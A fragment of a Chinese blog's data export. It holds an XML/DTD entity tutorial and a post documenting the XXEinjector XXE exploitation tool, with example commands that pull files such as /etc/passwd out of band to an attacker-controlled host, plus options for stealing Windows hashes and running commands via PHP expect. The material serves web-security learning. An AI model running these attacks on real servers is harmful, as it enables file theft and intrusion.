为不同的目的而设计：</p>\n<blockquote>\n<ul>\n<li>XML 被设计用来传输和存储数据。</li>\n<li>HTML 被设计用来显示数据。</li>\n</ul>\n</blockquote>\n<p>2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。</p>\n<p><strong>3.XML 是独立于软件和硬件的信息传输工具。</strong></p>\n<h2 id=\"0x01-XML结构\"><a href=\"#0x01-XML结构\" class=\"headerlink\" title=\"0x01 XML结构\"></a>0x01 XML结构</h2><blockquote>\n<p>XML文档是树形结构的，由根元素扩展，且必须包含根元素。</p>\n</blockquote>\n<p><strong>一个栗子:</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;note date=&quot;9102/2/28&quot;&gt;</span><br><span class=\"line\">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class=\"line\">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class=\"line\">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class=\"line\">  &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class=\"line\">&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一行是XML声明，指定XML版本以及编码方式，声明是可选的。</li>\n<li><code>&lt;note&gt;</code>为根元素，XML标签都是成对且闭合的，以<code>&lt;/note&gt;</code>闭合标签。</li>\n<li>XML是大小写敏感的，<code>&lt;note&gt;</code>与<code>&lt;Note&gt;</code>是不同的标签。</li>\n<li>标签是可以设置属性的，如例子中<code>&lt;note&gt;</code>标签的<code>date</code>，但是属性的值必须使用引号括起来。</li>\n</ul>\n<p><strong>实体引用：</strong></p>\n<p>在 XML 中，一些字符拥有特殊的意义。</p>\n<p>例如，如果把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 使用下面会发生错误 --&gt;</span><br><span class=\"line\">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>\n<p>为了避免这个错误，用<strong>实体引用</strong>来代替 “&lt;” 字符：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>\n<p>XML有5个预定义的实体引用：</p>\n<p><img src=\"/2019/02/28/xml/QQ截图20190228152213.png\" alt></p>\n<h2 id=\"0x02-DTD\"><a href=\"#0x02-DTD\" class=\"headerlink\" title=\"0x02 DTD\"></a>0x02 DTD</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块。</p>\n<p><strong>1.为什么使用DTD？</strong></p>\n<p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p>\n<p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>\n<p>还可以用DTD 来验证从外部接收到的、自身的数据。</p>\n<p><strong>2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p>\n<p>i.在文档内声明的栗子：<code>&lt;!DOCTYPE root-element [element-declarations]&gt;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    #定义此文档是 note 类型的文档。</span><br><span class=\"line\">  &lt;!ELEMENT note (to,from,heading,body)&gt;   #定义note元素有四个元素：&quot;to、from、heading、body&quot;</span><br><span class=\"line\">  &lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class=\"line\">  &lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class=\"line\">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class=\"line\">  &lt;!ELEMENT body (#PCDATA)&gt;   #定义body元素为&quot;#PCDATA&quot;类型</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt;</span><br><span class=\"line\">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class=\"line\">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class=\"line\">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class=\"line\">  &lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt;</span><br><span class=\"line\">&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p>ii.作为外部引用的例子：<code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;  #引用外部文件note.dtd</span><br><span class=\"line\">&lt;note&gt;</span><br><span class=\"line\">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class=\"line\">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class=\"line\">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class=\"line\">  &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class=\"line\">&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><code>note.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class=\"line\">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>3.DTD实体</strong></p>\n<p><strong>实体</strong>是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>\n<p><strong>实体引用</strong>是对实体的引用。引用后会获得实体指向的实际数据。</p>\n<p><strong>实体声明也是在DTD声明中，与元素声明同级。</strong></p>\n<p>i.在文档内部声明实体的例子：<code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note ANY&gt;   #定义note元素可以有任意元素。</span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;!ENTITY entity1 &quot;Be&quot;&gt;      #文档内声明</span><br><span class=\"line\">  &lt;!ENTITY entity2 &quot;back.&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt;&amp;entity1; &amp;entity2;&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p>ii.外部声明引用实体的例子：<code>&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</code> or <code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note ANY&gt;   </span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;!ENTITY entity1 SYSTEM &quot;http://www.sakuxa.com/example.xml&quot;&gt;  #system关键字表示外部引用</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt; &amp;entity1;&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p>iii.参数实体</p>\n<p>参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。</p>\n<p><strong>记住：%entity; 会被它指向的数据进行直接替换。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note ANY&gt;   </span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;!ENTITY % entity1 SYSTEM &quot;http://www.sakuxa.com/example.dtd&quot;&gt;</span><br><span class=\"line\">  %entity1  #会被example.dtd内容替换</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt; &amp;entity2;&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><code>example.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY entity2 &quot;Be back.&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>注意：</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-XML概述\"><a href=\"#0x00-XML概述\" class=\"headerlink\" title=\"0x00 XML概述\"></a>0x00 XML概述</h2><ul>\n<li>XML 指可扩展标记语言（eXtensible Markup Language）。</li>\n<li>XML 的设计宗旨是传输数据，而不是显示数据。</li>\n<li>XML 标签没有被预定义。</li>\n<li>XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。</li>\n</ul>\n<blockquote>\n<p>XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。</p>\n</blockquote>","more":"<p><strong>XML与HTML</strong></p>\n<p>1.XML 和 HTML 为不同的目的而设计：</p>\n<blockquote>\n<ul>\n<li>XML 被设计用来传输和存储数据。</li>\n<li>HTML 被设计用来显示数据。</li>\n</ul>\n</blockquote>\n<p>2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。</p>\n<p><strong>3.XML 是独立于软件和硬件的信息传输工具。</strong></p>\n<h2 id=\"0x01-XML结构\"><a href=\"#0x01-XML结构\" class=\"headerlink\" title=\"0x01 XML结构\"></a>0x01 XML结构</h2><blockquote>\n<p>XML文档是树形结构的，由根元素扩展，且必须包含根元素。</p>\n</blockquote>\n<p><strong>一个栗子:</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;note date=&quot;9102/2/28&quot;&gt;</span><br><span class=\"line\">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class=\"line\">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class=\"line\">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class=\"line\">  &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class=\"line\">&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一行是XML声明，指定XML版本以及编码方式，声明是可选的。</li>\n<li><code>&lt;note&gt;</code>为根元素，XML标签都是成对且闭合的，以<code>&lt;/note&gt;</code>闭合标签。</li>\n<li>XML是大小写敏感的，<code>&lt;note&gt;</code>与<code>&lt;Note&gt;</code>是不同的标签。</li>\n<li>标签是可以设置属性的，如例子中<code>&lt;note&gt;</code>标签的<code>date</code>，但是属性的值必须使用引号括起来。</li>\n</ul>\n<p><strong>实体引用：</strong></p>\n<p>在 XML 中，一些字符拥有特殊的意义。</p>\n<p>例如，如果把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 使用下面会发生错误 --&gt;</span><br><span class=\"line\">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>\n<p>为了避免这个错误，用<strong>实体引用</strong>来代替 “&lt;” 字符：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>\n<p>XML有5个预定义的实体引用：</p>\n<p><img src=\"/2019/02/28/xml/QQ截图20190228152213.png\" alt></p>\n<h2 id=\"0x02-DTD\"><a href=\"#0x02-DTD\" class=\"headerlink\" title=\"0x02 DTD\"></a>0x02 DTD</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块。</p>\n<p><strong>1.为什么使用DTD？</strong></p>\n<p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p>\n<p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>\n<p>还可以用DTD 来验证从外部接收到的、自身的数据。</p>\n<p><strong>2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p>\n<p>i.在文档内声明的栗子：<code>&lt;!DOCTYPE root-element [element-declarations]&gt;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    #定义此文档是 note 类型的文档。</span><br><span class=\"line\">  &lt;!ELEMENT note (to,from,heading,body)&gt;   #定义note元素有四个元素：&quot;to、from、heading、body&quot;</span><br><span class=\"line\">  &lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class=\"line\">  &lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class=\"line\">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class=\"line\">  &lt;!ELEMENT body (#PCDATA)&gt;   #定义body元素为&quot;#PCDATA&quot;类型</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt;</span><br><span class=\"line\">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class=\"line\">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class=\"line\">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class=\"line\">  &lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt;</span><br><span class=\"line\">&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p>ii.作为外部引用的例子：<code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;  #引用外部文件note.dtd</span><br><span class=\"line\">&lt;note&gt;</span><br><span class=\"line\">  &lt;to&gt;Mikasa&lt;/to&gt;</span><br><span class=\"line\">  &lt;from&gt;Allen&lt;/from&gt;</span><br><span class=\"line\">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class=\"line\">  &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class=\"line\">&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><code>note.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class=\"line\">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>3.DTD实体</strong></p>\n<p><strong>实体</strong>是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>\n<p><strong>实体引用</strong>是对实体的引用。引用后会获得实体指向的实际数据。</p>\n<p><strong>实体声明也是在DTD声明中，与元素声明同级。</strong></p>\n<p>i.在文档内部声明实体的例子：<code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note ANY&gt;   #定义note元素可以有任意元素。</span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;!ENTITY entity1 &quot;Be&quot;&gt;      #文档内声明</span><br><span class=\"line\">  &lt;!ENTITY entity2 &quot;back.&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt;&amp;entity1; &amp;entity2;&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p>ii.外部声明引用实体的例子：<code>&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</code> or <code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note ANY&gt;   </span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;!ENTITY entity1 SYSTEM &quot;http://www.sakuxa.com/example.xml&quot;&gt;  #system关键字表示外部引用</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt; &amp;entity1;&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p>iii.参数实体</p>\n<p>参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。</p>\n<p><strong>记住：%entity; 会被它指向的数据进行直接替换。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [    </span><br><span class=\"line\">  &lt;!ELEMENT note ANY&gt;   </span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;!ENTITY % entity1 SYSTEM &quot;http://www.sakuxa.com/example.dtd&quot;&gt;</span><br><span class=\"line\">  %entity1  #会被example.dtd内容替换</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt; &amp;entity2;&lt;/note&gt;</span><br></pre></td></tr></table></figure>\n<p><code>example.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY entity2 &quot;Be back.&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>注意：</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>"},{"title":"XXE漏洞利用工具及其资源","date":"2019-03-04T08:02:01.000Z","_content":"\n## 一、XXE Payload Cheatsheet\n\nhttps://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\n\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\n\n## 二、XXEinjector工具\n\n### 0x00 XXEinjector概述\n\nXXEinjector 是一款XXE Fuzz漏洞利用工具。\n\nXXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。\n\nXXEinjector 可以使用直接检索和带外的方式。\n\n<!-- more -->\n\nXXEinjector 的目录遍历（`--path`）只能用于Java应用程序。其他类型的应用程序只能使用爆破（`--brute`）的方法。\n\n带外方式要求目标主机可以访问我们指定的主机（`--host`），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）\n\n工具地址：https://github.com/enjoiz/XXEinjector\n\n### 0x01 基本重要参数使用方法\n\n`--file`：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用\"XXEINJECT\"来标记注入点。\n\n> ```\n> POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1\n> Host: 192.168.199.111\n> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\n> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n> Accept-Encoding: gzip, deflate\n> Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php\n> Content-Type: application/x-www-form-urlencoded\n> Content-Length: 30\n> Connection: close\n> Upgrade-Insecure-Requests: 1\n> \n> xml=XXEINJECT&submit=%E6%8F%90%E4%BA%A4\n> ```\n\n`--path`：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数`--brute`。\n\n> `--path=/etc`\n>\n> `--path=s://test.txt`\n\n`--brute`：该选项用于爆破文件，用于指定包含`文件路径`的字典文件。结果在`brute.log`文件中。\n\n> ```\n> s://test.txt\n> s://test1.txt\n> /etc/passwd\n> ```\n\n**工具包含直接和带外两种检索文件的方式。**\n\n**默认是带外方式：**\n\n`--oob=ftp/http/gopher`：带外方式提供ftp(默认)、http、gopher三种协议。\n\n> - ftp协议适用于任意类型WEB程序。\n> - http、gopher协议只适用于Java < 1.7的Java WEB应用程序。\n\n`--host`：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。\n\n`--httpport`：`--host`指定的主机监听的WEB服务端口。默认80\n\n`--ftpport`：`--host`指定的主机监听的FTP服务端口。默认21\n\n**直接方式**\n\n`--direct`：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。\n\n**其他参数：**\n\n`--verbose`：显示详细信息，可以显示攻击数据包等。推荐使用。\n\n`--phpfilter`：使用PHP filter对检索文件进行Base64编码。\n\n`--ssl`：用于https站点。\n\n`--expect`：使用 PHP expect 扩展执行系统命令。\n\n`--output`：`--brute`输出结果保留的文件。\n\n### 0x03 使用实例\n\n- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter`\n\n> 结果在Logs\\IP\\目录下。\n\n- `ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl`\n\n> 结果在brute.log文件中。\n\n```\n--host\t    必选项 - our IP address for reverse connections. (--host=192.168.0.2)\n--file\t    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用\"XXEINJECT\"来标记的注入点。                      (--file=/tmp/req.txt)\n\n--path\t    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)\n--brute\t    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)\n--logger    Log results only. Do not send requests. HTTP logger looks for \"p\" parameter with             results.\n  \n--rhost\t    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)\n--rport\t    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)\n\n--oob\t    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java < 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java < 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)\n\n--direct\t直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)\n\n--cdata\t    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.\n\n--2ndfile\tFile containing valid HTTP request used in second order exploitation. \n\t\t\t(--2ndfile=/tmp/2ndreq.txt)\n\n--phpfilter\t使用PHP filter对文件进行Base64编码.\n--netdoc    使用netdoc协议而不是file协议。 (Java).\n--enumports\tEnumerating unfiltered ports for reverse connection. Specify value \"all\" to     \t\t\tenumerate all TCP ports. (--enumports=21,22,80,443,445)\n\n--hashes\t窃取Windows哈希值.\n--expect\t使用 PHP expect 扩展执行系统命令. (--expect=ls)\n--upload\tUploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)\n\n--xslt\t    Tests for XSLT injection.\n\n--ssl\t    Use SSL.\n--proxy\t    Proxy to use. (--proxy=127.0.0.1:8080)\n--httpport\t   Set custom HTTP port. (--httpport=80)\n--ftpport\t   Set custom FTP port. (--ftpport=21)\n--gopherport   Set custom gopher port. (--gopherport=70)\n--jarport\t   Set custom port for uploading files using jar. (--jarport=1337)\n--xsltport\t   Set custom port for XSLT injection test. (--xsltport=1337)\n\n--test\t    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。\n\n--urlencode\tURL encode injected DTD. This is default for URI.\n--nodtd\t     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用\"--dtd\"可以看dtd              文件格式。\n\n--output\t爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中\n\t\t\t(--output=/tmp/out.txt)\n\n--timeout\t    Timeout for receiving file/directory content. (--timeout=20)\n--contimeout\tTimeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)\n\n--fast\t    Skip asking what to enumerate. Prone to false-positives.\n--verbose\t    Show verbose messages.\n```\n\n## 0x03 XXE学习资源\n\nhttps://nosec.org/home/detail/2139.html","source":"_posts/xxe-tool.md","raw":"---\ntitle: XXE漏洞利用工具及其资源\ndate: 2019-03-04 16:02:01\ntags: \n\t- Tools\n\t- Payload\n\t- Cheatsheet\n\t- XXE\ncategories:\n\t- WEB漏洞学习\n---\n\n## 一、XXE Payload 